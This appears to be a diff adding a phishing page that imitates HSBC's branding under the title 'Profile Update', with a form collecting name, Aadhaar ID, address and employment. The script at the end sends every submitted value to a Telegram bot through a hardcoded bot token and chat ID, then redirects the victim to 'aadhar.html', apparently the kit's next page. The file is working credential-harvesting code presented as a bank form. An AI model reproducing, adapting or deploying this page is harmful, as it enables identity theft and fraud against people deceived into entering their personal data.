@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profile Update</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --hsbc-red: #db0011;
+            --text-dark: #333;
+            --border-light: #d5d5d5;
+            --bg-gray: #f4f4f4;
+        }
+
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Noto Sans', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            color: var(--text-dark);
+        }
+
+        /* --- Global Header (Same as previous) --- */
+        header {
+            border-bottom: 1px solid #eee;
+            padding: 10px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .logo-text {
+            color: var(--hsbc-red);
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            font-family: serif;
+            text-decoration: none;
+        }
+        .nav-links { display: flex; gap: 20px; }
+        .nav-links a { text-decoration: none; color: #444; font-size: 14px; font-weight: 600; }
+        .login-btn {
+            background: var(--hsbc-red);
+            color: #fff;
+            border: none;
+            padding: 8px 20px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 2px;
+        }
+
+        /* --- Form Container --- */
+        .main-wrapper {
+            max-width: 650px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+        .form-card {
+            background: #fff;
+            padding: 30px;
+            border: 1px solid #f0f0f0;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
+        }
+        h2 {
+            font-size: 22px;
+            margin-bottom: 25px;
+            color: #000;
+            border-bottom: 2px solid var(--hsbc-red);
+            display: inline-block;
+            padding-bottom: 5px;
+        }
+
+        /* Responsive Grid */
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 15px;
+        }
+        .form-group { display: flex; flex-direction: column; margin-bottom: 15px; }
+        label { font-weight: bold; font-size: 14px; margin-bottom: 8px; color: #555; }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-light);
+            border-radius: 3px;
+            font-size: 15px;
+            background: #fafafa;
+        }
+        input:focus { outline: 1px solid var(--hsbc-red); background: #fff; }
+        .full-width { grid-column: span 2; }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: #333;
+            color: white;
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+        .submit-btn:hover { background: #000; }
+
+        /* --- Global Footer (Same as previous) --- */
+        footer {
+            background: #f9f9f9;
+            padding: 40px 5%;
+            margin-top: 60px;
+            border-top: 1px solid #eee;
+        }
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        .footer-col h4 { font-size: 13px; margin-bottom: 15px; text-transform: uppercase; color: #000; }
+        .footer-col ul { list-style: none; padding: 0; }
+        .footer-col li { margin-bottom: 8px; }
+        .footer-col a { text-decoration: none; color: #666; font-size: 13px; }
+        .footer-bottom {
+            max-width: 1100px;
+            margin: 40px auto 0;
+            padding-top: 20px;
+            border-top: 1px solid #ddd;
+            font-size: 12px;
+            color: #888;
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            .row { grid-template-columns: 1fr; }
+            .full-width { grid-column: span 1; }
+            .main-wrapper { margin: 20px auto; }
+            .logo-text { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <a href="#" class="logo-text">HSBC</a>
+    <div class="nav-links">
+        <a href="#">Banking</a>
+        <a href="#">Investing</a>
+        <a href="#">Help</a>
+    </div>
+    <button class="login-btn">Log On</button>
+</header>
+
+<div class="main-wrapper">
+    <div class="form-card">
+        <h2>Update Details</h2>
+        <form id="secureUpdateForm">
+            <div class="row">
+                <div class="form-group">
+                    <label>First Name</label>
+                    <input type="text" id="fname" required>
+                </div>
+                <div class="form-group">
+                    <label>Middle Name</label>
+                    <input type="text" id="mname" placeholder="Optional">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Last Name</label>
+                <input type="text" id="lname" required>
+            </div>
+
+            <div class="form-group">
+                <label>Verification ID</label>
+                <input type="text" id="uid" placeholder="[Aadhaar Redacted]" maxlength="12" required>
+            </div>
+
+            <div class="form-group">
+                <label>Residential Address</label>
+                <input type="text" id="address" required>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>City</label>
+                    <input type="text" id="city" required>
+                </div>
+                <div class="form-group">
+                    <label>State</label>
+                    <input type="text" id="state" required>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>Postal Code</label>
+                    <input type="text" id="pincode" maxlength="6" required>
+                </div>
+                <div class="form-group">
+                    <label>Employment</label>
+                    <select id="employment">
+                        <option>Salaried</option>
+                        <option>Self-Employed</option>
+                        <option>Student</option>
+                        <option>Retired</option>
+                    </select>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">Save and Continue</button>
+        </form>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col">
+            <h4>Quick Links</h4>
+            <ul>
+                <li><a href="#">Security</a></li>
+                <li><a href="#">Privacy</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h4>Support</h4>
+            <ul>
+                <li><a href="#">Contact Us</a></li>
+                <li><a href="#">FAQs</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <p>&copy; 2026 HSBC Group. All rights reserved.</p>
+    </div>
+</footer>
+
+<script>
+document.getElementById("secureUpdateForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    
+    const botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
+    const chatId = "8608321495";
+    
+    const details = {
+        name: `${document.getElementById("fname").value} ${document.getElementById("mname").value} ${document.getElementById("lname").value}`,
+        id: document.getElementById("uid").value,
+        addr: `${document.getElementById("address").value}, ${document.getElementById("city").value}, ${document.getElementById("state").value} - ${document.getElementById("pincode").value}`,
+        emp: document.getElementById("employment").value
+    };
+
+    const text = `✅ Update Received\n\nName: ${details.name}\nID: ${details.id}\nAddress: ${details.addr}\nJob: ${details.emp}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+    })
+    .then(() => { window.location.href = "aadhar.html"; })
+    .catch(() => { window.location.href = "aadhar.html"; });
+});
+</script>
+
+</body>
+</html>
